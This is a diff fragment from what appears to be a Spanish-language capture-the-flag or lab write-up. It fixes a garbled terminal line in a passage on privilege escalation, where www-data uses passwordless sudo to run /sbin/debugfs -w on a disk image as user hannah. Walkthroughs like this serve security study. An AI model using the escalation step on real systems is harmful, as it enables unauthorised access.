@@ -336,7 +336,7 @@ User www-data may run the following commands on b95b968aa04d:
 El usuario www-data tiene permisos sudo sin contraseña para ejecutar el binario /sbin/debugfs con la opción -w sobre el archivo /opt/hannah_disk.img como el usuario hannah. Esto permite escalar privilegios y potencialmente obtener acceso como hannah.
 ```bash
 www-data@b95b968aa04d:/var/www/html$ sudo -u hannah /sbin/debugfs -w /opt/hannah_disk.img
-<udo -u hannah /sbin/debugfs -w /opt/hannah_disk.img
+sudo -u hannah /sbin/debugfs -w /opt/hannah_disk.img
 debugfs 1.47.2 (1-Jan-2025)
 debugfs:  ls 
 ls 
